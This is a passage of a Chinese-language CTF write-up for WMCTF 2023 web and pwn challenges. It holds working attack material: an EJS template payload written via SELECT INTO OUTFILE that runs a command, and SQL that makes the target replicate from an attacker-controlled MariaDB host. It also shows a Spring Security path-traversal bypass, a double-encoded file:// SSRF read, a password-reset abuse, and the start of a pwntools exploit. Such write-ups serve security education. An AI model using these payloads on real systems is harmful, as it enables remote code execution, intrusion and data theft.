</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>4</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=n>Format_desc</span><span class=w>       </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>256</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=n>ver</span><span class=p>:</span><span class=w> </span><span class=mi>11</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>3</span><span class=o>-</span><span class=n>MariaDB</span><span class=o>-</span><span class=n>log</span><span class=p>,</span><span class=w> </span><span class=n>Binlog</span><span class=w> </span><span class=n>ver</span><span class=p>:</span><span class=w> </span><span class=mi>4</span><span class=w>                                                                                                      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>256</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid_list</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>281</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=p>[]</span><span class=w>                                                                                                                                                 </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>281</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Binlog_checkpoint</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>320</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w>                                                                                                                                   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>320</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>358</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>1</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>358</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>448</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=k>drop</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test</span><span class=w>                                                                                                                                 </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>448</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>486</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>2</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>486</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>578</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=k>drop</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test1</span><span class=w>                                                                                                                                </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>578</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>616</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>3</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>616</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>708</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=k>drop</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test2</span><span class=w>                                                                                                                                </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>708</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>746</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>4</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>746</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>838</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=k>drop</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test5</span><span class=w>                                                                                                                                </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>838</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>876</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>5</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>876</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>968</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=k>drop</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test6</span><span class=w>                                                                                                                                </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>968</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1006</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>6</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1006</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1089</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=k>create</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test</span><span class=w>                                                                                                                               </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1089</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1127</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>7</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1127</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1348</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>use</span><span class=w> </span><span class=o>`</span><span class=n>test</span><span class=o>`</span><span class=p>;</span><span class=w> </span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>employees</span><span class=w> </span><span class=p>(</span><span class=w>                                                                                                               </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                  </span><span class=o>|</span><span class=w>      </span><span class=o>|</span><span class=w>                   </span><span class=o>|</span><span class=w>           </span><span class=o>|</span><span class=w>             </span><span class=o>|</span><span class=w>                        </span><span class=n>id</span><span class=w> </span><span class=nb>INT</span><span class=p>,</span><span class=w>                                                                                                                     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                  </span><span class=o>|</span><span class=w>      </span><span class=o>|</span><span class=w>                   </span><span class=o>|</span><span class=w>           </span><span class=o>|</span><span class=w>             </span><span class=o>|</span><span class=w>                    </span><span class=n>name</span><span class=w> </span><span class=nb>VARCHAR</span><span class=p>(</span><span class=mi>100</span><span class=p>),</span><span class=w>                                                                                                              </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                  </span><span class=o>|</span><span class=w>      </span><span class=o>|</span><span class=w>                   </span><span class=o>|</span><span class=w>           </span><span class=o>|</span><span class=w>             </span><span class=o>|</span><span class=w>                        </span><span class=n>age</span><span class=w> </span><span class=nb>INT</span><span class=w>                                                                                                                     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                  </span><span class=o>|</span><span class=w>      </span><span class=o>|</span><span class=w>                   </span><span class=o>|</span><span class=w>           </span><span class=o>|</span><span class=w>             </span><span class=o>|</span><span class=w>                        </span><span class=p>)</span><span class=w>                                                                                                                           </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1348</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1386</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=k>BEGIN</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>8</span><span class=w>                                                                                                                                   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1386</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1583</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>use</span><span class=w> </span><span class=o>`</span><span class=n>test</span><span class=o>`</span><span class=p>;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=s1>&#39;&lt;%= process.mainModule.require(&#34;child_process&#34;).execSync(&#34;/readflag&#34;).toString() %&gt;&#39;</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;/home/ezblog/views/114.ejs&#39;</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1583</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Xid</span><span class=w>               </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1610</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=k>COMMIT</span><span class=w> </span><span class=cm>/* xid=116 */</span><span class=w>                                                                                                                               </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1610</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Gtid</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1648</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>GTID</span><span class=w> </span><span class=mi>0</span><span class=o>-</span><span class=mi>2</span><span class=o>-</span><span class=mi>9</span><span class=w>                                                                                                                                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=o>-</span><span class=n>bin</span><span class=p>.</span><span class=mi>000001</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1648</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Query</span><span class=w>             </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=mi>1733</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=k>create</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test2</span><span class=w>                                                                                                                              </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></span></code></pre></td></tr></table></div></div><p>在题目的<code>/api/debugger/python/execute</code> 路由上执行如下SQL，然后利用<code>/api/debugger/template/test</code>路由访问<code>114.ejs</code>模板即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=k>create</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>mysql</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>gtid_slave_pos</span><span class=w> </span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=o>`</span><span class=n>domain_id</span><span class=o>`</span><span class=w> </span><span class=nb>int</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span><span class=w> </span><span class=n>unsigned</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=o>`</span><span class=n>sub_id</span><span class=o>`</span><span class=w> </span><span class=nb>bigint</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span><span class=w> </span><span class=n>unsigned</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=o>`</span><span class=n>server_id</span><span class=o>`</span><span class=w> </span><span class=nb>int</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span><span class=w> </span><span class=n>unsigned</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=o>`</span><span class=n>seq_no</span><span class=o>`</span><span class=w> </span><span class=nb>bigint</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span><span class=w> </span><span class=n>unsigned</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>PRIMARY</span><span class=w> </span><span class=k>KEY</span><span class=w> </span><span class=p>(</span><span class=o>`</span><span class=n>domain_id</span><span class=o>`</span><span class=p>,</span><span class=o>`</span><span class=n>sub_id</span><span class=o>`</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=p>)</span><span class=w> </span><span class=n>ENGINE</span><span class=o>=</span><span class=n>MyISAM</span><span class=w> </span><span class=k>DEFAULT</span><span class=w> </span><span class=n>CHARSET</span><span class=o>=</span><span class=n>utf8</span><span class=w> </span><span class=k>COMMENT</span><span class=o>=</span><span class=s1>&#39;Replication slave GTID state&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>CHANGE</span><span class=w> </span><span class=n>MASTER</span><span class=w> </span><span class=k>TO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>MASTER_HOST</span><span class=o>=</span><span class=s1>&#39;192.168.2.203&#39;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>MASTER_USER</span><span class=o>=</span><span class=s1>&#39;shukuang&#39;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>MASTER_PASSWORD</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>MASTER_LOG_FILE</span><span class=o>=</span><span class=s1>&#39;mysql-bin.000001&#39;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>MASTER_LOG_POS</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>START</span><span class=w> </span><span class=n>SLAVE</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>show</span><span class=w> </span><span class=n>slave</span><span class=w> </span><span class=n>status</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>参考连接：</p><p><a href=https://mariadb.com/kb/en/documentation/>https://mariadb.com/kb/en/documentation/</a></p><h2 id=anyfileread>AnyFileRead</h2><p>绕过SpringSecurity读flag，需要注意编码解析问题，用burp即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>/admin/../flag
</span></span></code></pre></td></tr></table></div></div><h2 id=ez_java_agagin>ez_java_agagin</h2><p><img src=/img/2023-08-19Wmctf/20230821210708558.jpg alt=img></p><p>/usr/share/java/这个目录有java，file:///列根目录发现flag文件，flag被过滤用二次编码绕</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>/Imagefile?url1<span class=o>=</span>file:///usr/share/java/../../../../%2566%256c%2561%2567
</span></span></code></pre></td></tr></table></div></div><h2 id=你的权限放着我来>你的权限放着我来</h2><p><a href=http://b122e3c7-3f13-4c4b-8c92-9639c6ad9de5.wmctf.wm-team.cn/>http://b122e3c7-3f13-4c4b-8c92-9639c6ad9de5.wmctf.wm-team.cn/</a></p><p>/api/change</p><p>任意用户重置</p><p>重置jom@roomke.com的密码 拿到flag flag{test_flag}</p><h1 id=pwn>Pwn</h1><h2 id=blindless>Blindless</h2><p>Libc大师题，改elf的linkmap的l_addr到backdoor，爆破1位，控制一下fini_array什么的l_info指向0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;1.13.101.243&#39;</span><span class=p>,</span><span class=s1>&#39;27227&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>script</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bpt</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>,</span><span class=n>bigFileOff</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=n>addr_or_sym</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x400000</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>bigFileOff</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;b * </span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;brva </span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>type</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>script</span> <span class=o>+=</span> <span class=s1>&#39;b &#39;</span> <span class=o>+</span> <span class=n>addr_or_sym</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>type</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>addr_or_sym</span><span class=p>:</span>
